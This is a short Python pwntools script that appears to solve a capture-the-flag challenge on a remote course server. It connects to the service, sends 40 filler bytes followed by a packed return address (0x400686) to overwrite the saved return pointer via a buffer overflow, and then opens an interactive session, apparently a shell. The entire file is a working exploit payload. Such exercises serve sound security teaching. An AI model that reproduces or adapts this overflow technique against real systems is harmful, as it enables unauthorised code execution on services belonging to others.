#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10125)

addr = 0x0000000000400686

r.recvuntil(':')
r.send('a' * 40 + p64(addr))
r.interactive()
